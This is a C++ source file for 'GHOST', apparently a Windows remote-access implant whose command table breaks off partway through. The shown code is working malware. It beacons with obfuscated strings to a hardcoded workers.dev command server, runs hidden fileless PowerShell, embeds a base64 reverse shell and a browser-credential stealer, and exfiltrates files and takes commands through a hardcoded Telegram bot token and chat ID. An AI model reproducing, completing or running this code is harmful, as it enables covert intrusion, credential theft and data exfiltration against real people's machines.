// c2.cpp — GHOST C2 (all features, no unused globals, full Telegram poller)
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <random>
#include <wincrypt.h>

// ─── No pragma – linked via build.sh ──────────────────────────────────────

namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;

// Derive 32-byte key as SHA-256(sessionId) — must match worker's deriveKey(sid)
static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
    std::string utf8 = WStringToUTF8(sessionId);
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::vector<BYTE> result(32, 0);
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return result;
    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptHashData(hHash, reinterpret_cast<const BYTE*>(utf8.data()), static_cast<DWORD>(utf8.size()), 0);
        DWORD len = 32;
        CryptGetHashParam(hHash, HP_HASHVAL, result.data(), &len, 0);
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
    return result;
}

// ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
static void DebugLog(const wchar_t* msg) {
    char narrow[512];
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
    printf("[GHOST] %s\n", narrow);
    OutputDebugStringW(L"[GHOST] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static HMODULE hW = []() -> HMODULE {
            HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
            return m ? m : LoadLibraryA(XS("winhttp.dll"));
        }();
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 20000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  C2 HOST
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (encrypted)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string plainBody = BuildBeaconJson(session);

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";

    DebugLog(L"Sending encrypted beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", encBody, L"");

    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string encCmd = JsonGetString(resp.body, "enc");
    std::string cmd;
    if (!encCmd.empty() && !g_SessionKey.empty()) {
        std::string decrypted = AesGcmDecrypt(g_SessionKey, encCmd);
        if (!decrypted.empty()) {
            cmd = JsonGetString(decrypted, "cmd");
        }
    }
    if (cmd.empty()) cmd = JsonGetString(resp.body, "cmd");

    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (encrypted)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string plainBody = "{\"session\":\"" + sid +
                            "\",\"output\":\"" + out + "\"}";

    std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
    if (enc.empty()) enc = plainBody;

    std::string encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"}";
    DebugLog(L"Sending encrypted result " + std::to_wstring(output.size()) + L" chars");
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", encBody, L"");
    return (resp.status == 200);
}

// =====================================================================
//  FILELESS POWERSHELL EXECUTOR
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Command) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64Command);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  WALLPAPER
// =====================================================================
static std::wstring HandleWallpaper(const std::string& args) {
    if (args.empty() || args == "reset") {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        return L"[+] Wallpaper reset to default.";
    }
    std::wstring wPath = UTF8ToWString(args);
    if (GetFileAttributesW(wPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        return L"[error: file not found]";
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(),
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        return L"[+] Wallpaper changed to: " + wPath;
    }
    DWORD err = GetLastError();
    return L"[error: failed to set wallpaper (code=" + std::to_wstring(err) + L")";
}

// =====================================================================
//  REVERSE SHELL (fixed base64 string)
// =====================================================================
static std::wstring HandleReverse(const std::string& args) {
    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
    std::string ip, port = "443";
    size_t colon = args.find(':');
    if (colon == std::string::npos) {
        ip = args;
    } else {
        ip = args.substr(0, colon);
        port = args.substr(colon + 1);
    }

    static const char* b64Template =
        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnACUASQAlACcALAAlAFAATwBSAFQAJQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABLAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAYgA9ACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAZwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAYgB0AD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=";

    std::vector<BYTE> decodedTemplate = Base64Decode(b64Template);
    if (decodedTemplate.empty()) return L"[error: invalid template]";
    std::string script = std::string(reinterpret_cast<char*>(decodedTemplate.data()), decodedTemplate.size());
    size_t pos = script.find("%IP%");
    if (pos != std::string::npos) script.replace(pos, 4, ip);
    pos = script.find("%PORT%");
    if (pos != std::string::npos) script.replace(pos, 6, port);

    std::wstring wScript = UTF8ToWString(script);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
}

// =====================================================================
//  BROWSER CREDENTIALS (base64‑encoded)
// =====================================================================
static std::wstring HandleBrowser(const std::string& args) {
    static const char* b64Script =
        "JAByAD0AQAoAIgBzAGUAbABlAGMAdAAgAHUAaABlAHIAbgBhAG0AZQAsACAAYQBjAGMA"
        "bwB1AG4AdAAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBvAGYAIABpAGQAIABmAHIAbwBt"
        "ACAATQBpAGMAcgBvAHMAbwBmAHQALgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEA"
        "dABhAC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAQQBDAEUAbwB1AHQAIAA9ACAAIgAi"
        "ADsAIABpAGYAIAAoACQAYwByAGUAZABzACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsA"
        "IAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0"
        "AGUAbQAuAEQAYQB0AGEALgBTAG8AdQByAGMAZQBTAHAAcgBpAG4AZwAuAFMAcQBDAGwA"
        "aQBlAG4AdAAgACgAIgBEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAOwBQ"
        "AG8AbwBsAGkAbgBnAD0ARgBhAGwAcwBlACIAKQA7ACAAJABjAG8AbQBtAGEAbgBkACA9"
        "ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABlAEUAeABlAGMAdQB0AGUAQwBvAG0A"
        "bQBhAG4AZAAoACIAcwBlAGwAZQBjAHQAIAB1AHMAZQByAG4AYQBtAGUALAAgAHAAYQBz"
        "AHMAdwBvAHIAZAAgAEYAUwBSAE0AIABGAEUAUgBOACAARgByAG8AbQAgAEwAbwBnAGkA"
        "bgAgAEQAYQB0AGEAIgApADsAIAAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBh"
        "AG4AZAAuAEUAeABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUA"
        "IAAoACQAcgBlAGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwBy"
        "AGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkA"
        "OwAgACQAYgBhAHMAZQA2ADQAIAA9ACAAWwBDAHIAZQBkAGUAbgB0AGkAYQBsAF0AOgA6"
        "AFUAbgBwAHIAbwB0AGUAYwB0ACgAJAByAGUAYwBvAHIAZAAuAHUAcwBlAHIAbgBhAG0A"
        "ZQAsACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAApADsAIAAkAGMAbABp"
        "AGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQA"
        "YQB0AGEALgBTAG8AdQByAGMAZQBQAHIAbwB2AGkAZABlAHIALgBTAFEAQwBsAGkAZQBu"
        "AHQAIAAoACIANABEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAIgApADsA"
        "IAAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABl"
        "AEUAeABlAGMAdQB0AGUAQwBvAG0AbQBhAG4AZAAoACIAcAByAG8AZgBpAGwAZQAgAHUA"
        "cwBlAHIAbgBhAG0AZQAgAGEAcgBjACAAYQBjAGMAbwB1AG4AdAAgAHAAYQBzAHMAdwBv"
        "AHIAZAAgAHUAcwBlAHIAIABpAGQAIABmAHIAbwBtACAATQBpAGMAcgBvAHMAbwBmAHQA"
        "LgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEAdABhAC4AQwByAGUAZABlAG4AdABp"
        "AGEAbAAiACkAOwAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBhAG4AZAAuAEUA"
        "eABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUAIAAoACQAcgBl"
        "AGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwByAGQAIAA9ACAA"
        "JAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkAOwAgACQAYgBh"
        "AHMAZQA2ADQAIAA9ACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAA7ACAA"
        "JABjAHIAZQBkAHMAIAArAD0AIAAiAFMASQBkADoAIAAkAHIAZQBjAG8AcgBkAC4AdQBz"
        "AGUAcgBuAGEAbQBlACAAfAAgACQAYgBhAHMAZQA2ADQAIgA7ACAAfQAgAH0AIAAkAGMA"
        "cgBlAGQAcwA=";

    std::vector<BYTE> decoded = Base64Decode(b64Script);
    if (decoded.empty()) return L"[error: invalid script]";
    std::string script(reinterpret_cast<char*>(decoded.data()), decoded.size());
    std::wstring wScript = UTF8ToWString(script);
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"Browser data:\n" + result;
}

// =====================================================================
//  TELEGRAM EXFILTRATION (token & chat ID obfuscated with XSW)
// =====================================================================
static std::wstring HandleTelegram(const std::string& args) {
    if (args.empty()) return L"Usage: !telegram <local_path> [<caption>]";

    std::string localPath, caption;
    size_t space = args.find(' ');
    if (space == std::string::npos) {
        localPath = args;
        caption = "";
    } else {
        localPath = args.substr(0, space);
        caption = args.substr(space + 1);
    }

    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return L"[error: file not found]";
    }
    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    if (fileSize.QuadPart > 50 * 1024 * 1024) {
        CloseHandle(hFile);
        return L"[error: file too large (>50 MB)]";
    }
    std::vector<char> fileData(static_cast<size_t>(fileSize.QuadPart));
    DWORD bytesRead = 0;
    ReadFile(hFile, fileData.data(), static_cast<DWORD>(fileData.size()), &bytesRead, NULL);
    CloseHandle(hFile);

    std::string boundary = "----GHOSTBOUNDARY" + std::to_string(GetTickCount());
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + std::string(PathFindFileNameA(localPath.c_str())) + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(fileData.data(), fileData.size());
    body += "\r\n";
    if (!caption.empty()) {
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
        body += caption + "\r\n";
    }
    body += "--" + boundary + "--\r\n";

    auto token = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ");
    auto chatId = XSW(L"8575201154");

    std::wstring path = L"/bot" + std::wstring(token.str()) + L"/sendDocument";
    std::string headers =
        "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
        "Content-Length: " + std::to_string(body.size()) + "\r\n";

    HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"POST", path, body, UTF8ToWString(headers));

    if (resp.status == 200) {
        return L"[+] File sent to Telegram: " + UTF8ToWString(localPath);
    } else {
        return L"[error: upload failed (HTTP " + std::to_wstring(resp.status) + L")]";
    }
}

// =====================================================================
//  TELEGRAM COMMAND POLLING (full implementation)
// =====================================================================
static DWORD WINAPI TelegramPoller(LPVOID) {
    DebugLog(L"Telegram poller started.");
    int lastUpdateId = 0;
    auto token = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ");
    auto chatId = XSW(L"8575201154");

    while (true) {
        std::wstring path = L"/bot" + std::wstring(token.str()) +
                            L"/getUpdates?offset=" + std::to_wstring(lastUpdateId + 1) +
                            L"&timeout=60";
        HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"GET", path, "", L"");

        if (resp.status == 200 && !resp.body.empty()) {
            std::string body = resp.body;
            // Parse JSON to extract update_id and text
            size_t textPos = body.find("\"text\":\"");
            while (textPos != std::string::npos) {
                size_t start = textPos + 7;
                size_t end = body.find('\"', start);
                if (end == std::string::npos) break;
                std::string command = body.substr(start, end - start);

                // Extract update_id to mark as read
                size_t updateIdPos = body.rfind("\"update_id\":", textPos);
                if (updateIdPos != std::string::npos) {
                    size_t idStart = updateIdPos + 12;
                    size_t idEnd = body.find(',', idStart);
                    if (idEnd == std::string::npos) idEnd = body.find('}', idStart);
                    if (idEnd != std::string::npos) {
                        std::string idStr = body.substr(idStart, idEnd - idStart);
                        int updateId = atoi(idStr.c_str());
                        if (updateId > lastUpdateId) lastUpdateId = updateId;
                    }
                }

                // Process command
                if (command[0] == '/') {
                    DebugLog(L"Telegram command: " + UTF8ToWString(command));
                    std::wstring cmdW = UTF8ToWString(command);
                    std::wstring result;
                    if (cmdW == L"/ping") {
                        result = L"Pong!";
                    } else if (cmdW.substr(0, 6) == L"/exec ") {
                        std::wstring execCmd = cmdW.substr(6);
                        result = ExecuteCommand(execCmd);
                    } else if (cmdW == L"/sessions") {
                        result = L"Session ID: " + g_SessionId;
                    } else if (cmdW == L"/help") {
                        result = L"Commands: /ping, /exec <cmd>, /sessions, /help";
                    } else {
                        result = L"Unknown command. Type /help";
                    }

                    // Send reply via POST with JSON body — GET breaks on any output
                    // containing '&', '=', spaces, or newlines
                    std::string replyBody = "{\"chat_id\":" + WStringToUTF8(std::wstring(chatId.str())) +
                                           ",\"text\":\"" + JsonEscape(WStringToUTF8(result)) + "\"}";
                    std::wstring replyPath = L"/bot" + std::wstring(token.str()) + L"/sendMessage";
                    WinHttpRequest(L"api.telegram.org", 443, L"POST", replyPath, replyBody, L"");
                }

                // Move to next message
                textPos = body.find("\"text\":\"", end);
            }
        }
        Sleep(3000);
    }
    return 0;
}

// =====================================================================
//  STUB HANDLERS
// =====================================================================
static std::wstring HandlePs(const std::string& /*args*/) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    std::wstring out = L"PID      PPID     NAME\n";
    out += L"-------- -------- ------------------------\n";
    if (Process32FirstW(snap, &pe)) {
        do {
            wchar_t line[256];
            swprintf_s(line, L"%-8lu %-8lu %s\n",
                       pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            out += line;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}
static std::wstring HandleLol(const std::string& args) { return L"lol stub"; }
static std::wstring HandleInject(const std::string& args) { return L"inject stub"; }
static std::wstring HandleInjectApc(const std::string& args) { return L"inject-apc stub"; }
static std::wstring HandleMigrate(const std::string& args) { return L"migrate stub"; }
static std::wstring HandleExfil(const std::string& args) { return L"exfil stub"; }
static std::wstring HandleWipe(const std::string& args) { return L"wipe stub"; }
static std::wstring HandleLateral(const std::string& args) { return L"lateral stub"; }
static std::wstring HandleCreds(const std::string& args) { return L"creds stub"; }
static std::wstring HandleDownload(const std::string& args) { return L"download stub"; }
static std::wstring HandleUpload(const std::string& args) { return L"upload stub"; }

// =====================================================================
//  COMMAND TABLE
// =====================================================================
struct CmdEntry {
    const char* prefix;
    bool        exactMatch;
    std::wstring (*handler)(const std::string& args);
};

static const CmdEntry kCmdTable[] = {
    { "!ps ",         false, HandlePs },
    { "!lol ",        false, HandleLol },
    { "!inject-apc ", false, HandleInjectApc },
    { "!inject ",     false, HandleInject },
    { "!migrate ",    false, HandleMigrate },
    { "!exfil ",      false, HandleExfil },
    { "!wipe",        false, HandleWipe },
    { "!lateral ",    false, HandleLateral },
    { "!creds",       true,  HandleCreds },
    { "ps",           true,  HandlePs },
    { "download ",    false, HandleDownload },
    { "upload ",      false, HandleUpload },
    { "!wallpaper ",  false, HandleWallpaper },
    { "!reverse ",    false, HandleReverse },
